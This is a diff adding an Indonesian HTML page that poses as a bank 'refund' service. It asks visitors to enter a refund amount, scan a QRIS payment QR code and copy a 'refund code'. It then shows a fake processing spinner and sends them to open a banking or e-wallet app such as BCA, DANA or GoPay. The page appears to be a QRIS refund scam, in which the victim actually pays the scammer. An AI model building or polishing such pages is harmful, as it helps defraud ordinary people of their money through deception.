@@ -1,0 +1,309 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta property="og:title" content="Layanan Bantuan pengembalian Dana  " />
+<meta property="og:description" content="Selamat datang Layanan Refund dana ." />
+<meta property="og:image" content="https://aritil.wordpress.com/wp-content/uploads/2026/05/1777909565928_1000145114.webp?w=1024" />
+<meta property="og:url" content="https://pengembalian-dana-refund-co-id.netlify.app/" />
+
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Pengembalian Dana </title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: Arial, sans-serif;
+        }
+        body {
+            background-color: #0052CC;
+            padding: 20px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+        .container {
+            max-width: 400px;
+            width: 100%;
+            background: white;
+            border-radius: 15px;
+            padding: 25px;
+            box-shadow: 0 5px 15px rgba(0,0,0,0.2);
+        }
+        h2 {
+            text-align: center;
+            color: ##0052CC;
+            margin-bottom: 20px;
+            font-size: 22px;
+        }
+        .input-box {
+            margin-bottom: 20px;
+        }
+        label {
+            display: block;
+            color: #333;
+            margin-bottom: 8px;
+            font-weight: bold;
+        }
+        input {
+            width: 100%;
+            padding: 12px;
+            border: 2px solid #ddd;
+            border-radius: 8px;
+            font-size: 16px;
+        }
+        input:focus {
+            border-color: #0052CC;
+            outline: none;
+        }
+        .qris-box {
+            text-align: center;
+            padding: 20px;
+            background: #f9f9f9;
+            border-radius: 10px;
+            margin-bottom: 15px;
+            border: 2px solid #eee;
+        }
+        img {
+            width: 220px;
+            height: auto;
+            border: 5px solid #fff;
+            border-radius: 10px;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.1);
+        }
+        .info {
+            text-align: center;
+            font-size: 14px;
+            color: #555;
+            font-weight: bold;
+            margin-bottom: 10px;
+        }
+        .kupon-area {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        .kode-text {
+            font-size: 14px;
+            color: #333;
+            font-weight: bold;
+            margin-bottom: 5px;
+            word-break: break-all;
+        }
+        .btn-salin {
+            background-color: #28a745;
+            color: white;
+            border: none;
+            padding: 4px 10px;
+            font-size: 12px;
+            border-radius: 4px;
+            cursor: pointer;
+        }
+        .btn-salin:hover {
+            background-color: #218838;
+        }
+        .btn-download {
+            display: block;
+            width: 100%;
+            padding: 14px;
+            background-color: #0052CC;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 18px;
+            font-weight: bold;
+            cursor: pointer;
+        }
+        .btn-download:hover {
+            background-color: #003d99;
+        }
+
+        /* STYLE LOADING */
+        .loading-box {
+            display: none;
+            text-align: center;
+            padding: 40px 20px;
+        }
+        .spinner {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #0052CC;
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 15px;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        /* STYLE HALAMAN PILIHAN BANK */
+        .bank-container {
+            display: none;
+        }
+        .bank-title {
+            text-align: center;
+            font-weight: bold;
+            margin-bottom: 20px;
+            color: #333;
+            font-size: 18px;
+        }
+        .bank-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 15px;
+        }
+        .bank-btn {
+            padding: 18px 12px;
+            background-color: #f8f8f8;
+            border: 2px solid #ddd;
+            border-radius: 8px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.2s;
+            font-size: 15px;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            min-height: 65px;
+            width: 100%; /* Biar lebar sama semua */
+        }
+        .bank-btn img {
+            width: 32px;
+            height: 32px;
+            border: none;
+            box-shadow: none;
+            object-fit: contain;
+            flex-shrink: 0;
+        }
+        .bank-btn:hover {
+            background-color: #0052CC;
+            color: white;
+            border-color: #0052CC;
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+
+    <!-- HALAMAN 1: QRIS & INPUT -->
+    <div id="page1">
+        <h2>Pengembalian dana Refund</h2>
+
+        <div class="input-box">
+            <label> Masukan Nominal Refund Anda (Rp):</label>
+            <input type="text" id="nominal" placeholder="0" value="0" oninput="formatRupiah(this)">
+        </div>
+
+        <div class="qris-box">
+            <p>Scan QR Code ini:</p>
+            <img id="qrisImage" src="https://aritil.wordpress.com/wp-content/uploads/2026/05/1777735666992_1000144244.jpg?w=298" alt="QRIS REFUND DANA ANDA">
+        </div>
+
+        <div class="kupon-area">
+            <p class="kode-text">✅ KODE REFUAD DANA ANDA 211410008131541494</p>
+            <button class="btn-salin" onclick="salinKode()">📋 SALIN</button>
+        </div>
+
+        <button class="btn-download" onclick="prosesLanjutkan()">📥 Lanjutkan</button>
+    </div>
+
+    <!-- HALAMAN LOADING -->
+    <div id="loadingPage" class="loading-box">
+        <div class="spinner"></div>
+        <p>Sedang memproses data...</p>
+        <p style="font-size: 12px; margin-top: 5px;">Mohon tunggu sebentar</p>
+    </div>
+
+    <!-- HALAMAN 2: PILIHAN BANK -->
+    <div id="page2" class="bank-container">
+        <h2>Pilih Metode Pengembalian Dana Refund Anda</h2>
+        <p class="bank-title">Silakan pilih Bank atau E-Wallet Anda</p>
+        <div class="bank-grid">
+            <button class="bank-btn" onclick="window.open('https://play.google.com/store/apps/details?id=id.co.bri.brimo', '_blank')">
+                <img src="https://shopeeindonesia01.wordpress.com/wp-content/uploads/2026/04/1776248239536_1000136239.png" alt="BRI"> BRI
+            </button>
+            <button class="bank-btn" onclick="window.open('https://play.google.com/store/apps/details?id=com.bca', '_blank')">
+                <img src="https://aritil.wordpress.com/wp-content/uploads/2026/05/1777818823880_1000144714.jpg" alt="BCA"> BCA
+            </button>
+            <button class="bank-btn" onclick="window.open('https://play.google.com/store/apps/details?id=id.bni.wondr', '_blank')">
+                <img src="https://aritil.wordpress.com/wp-content/uploads/2026/05/1777905165020_1000145095.png" alt="BNI"> BNI
+            </button>
+            <button class="bank-btn" onclick="window.open('https://play.google.com/store/apps/details?id=id.bmri.livin', '_blank')">
+                <img src="https://aritil.wordpress.com/wp-content/uploads/2026/05/1777905272659_1000145096.jpg" alt="Mandiri"> Mandiri
+            </button>
+            <button class="bank-btn" onclick="window.open('https://play.google.com/store/apps/details?id=id.dana', '_blank')">
+                <img src="https://aritil.wordpress.com/wp-content/uploads/2026/05/1777905389591_1000145097.png" alt="DANA"> DANA
+            </button>
+            <button class="bank-btn" onclick="window.open('https://play.google.com/store/apps/details?id=ovo.id', '_blank')">
+                <img src="https://aritil.wordpress.com/wp-content/uploads/2026/05/1777905497182_1000145098.jpg" alt="OVO"> OVO
+            </button>
+            <button class="bank-btn" onclick="window.open('https://play.google.com/store/apps/details?id=com.telkom.mwallet', '_blank')">
+                <img src="https://aritil.wordpress.com/wp-content/uploads/2026/05/1777906834190_1000145105.png" alt="LinkAja"> LinkAja
+            </button>
+            <button class="bank-btn" onclick="window.open('https://play.google.com/store/apps/details?id=com.gojek.gopay', '_blank')">
+                <img src="https://aritil.wordpress.com/wp-content/uploads/2026/05/1777906940040_1000145106.png" alt="GoPay"> GoPay
+            </button>
+            <button class="bank-btn" onclick="window.open('https://play.google.com/store/apps/details?id=com.shopeepay.id', '_blank')">
+                <img src="https://aritil.wordpress.com/wp-content/uploads/2026/05/1777907073370_1000145107.jpg" alt="ShopeePay"> ShopeePay
+            </button>
+            <button class="bank-btn" onclick="window.open('https://play.google.com/store/apps/details?id=id.co.bankbkemobile.digitalbank', '_blank')">
+                <img src="https://aritil.wordpress.com/wp-content/uploads/2026/05/1777907231352_1000145110.jpg" alt="Seabank"> SeaBank
+            </button>
+        </div>
+    </div>
+
+</div>
+
+<script>
+    function salinKode() {
+        const kode = "211410008131541494";
+        navigator.clipboard.writeText(kode).then(() => {
+            alert("Kode berhasil disalin!");
+        });
+    }
+
+    function prosesLanjutkan() {
+        const page1 = document.getElementById('page1');
+        const loadingPage = document.getElementById('loadingPage');
+        const page2 = document.getElementById('page2');
+
+        // Sembunyikan halaman awal, tampilkan loading
+        page1.style.display = 'none';
+        loadingPage.style.display = 'block';
+
+        // Tunggu 3 detik, lalu ganti ke halaman pilihan bank
+        setTimeout(() => {
+            loadingPage.style.display = 'none';
+            page2.style.display = 'block';
+        }, 3000); // 3 detik
+    }
+
+    // FUNGSI FORMAT RUPIAH (ADA TITIK)
+    function formatRupiah(input) {
+        // Hapus semua karakter selain angka
+        let angka = input.value.replace(/[^,\d]/g, '').toString();
+        
+        // Pisahkan ribuan
+        let split = angka.split(',');
+        let sisa = split[0].length % 3;
+        let rupiah = split[0].substr(0, sisa);
+        let ribuan = split[0].substr(sisa).match(/\d{3}/gi);
+
+        // Tambahkan titik jika ada angka ribuan
+        if (ribuan) {
+            separator = sisa ? '.' : '';
+            rupiah += separator + ribuan.join('.');
+        }
+
+        // Update nilai input
+        input.value = rupiah;
+    }
+</script>
+
+</body>
+</html>
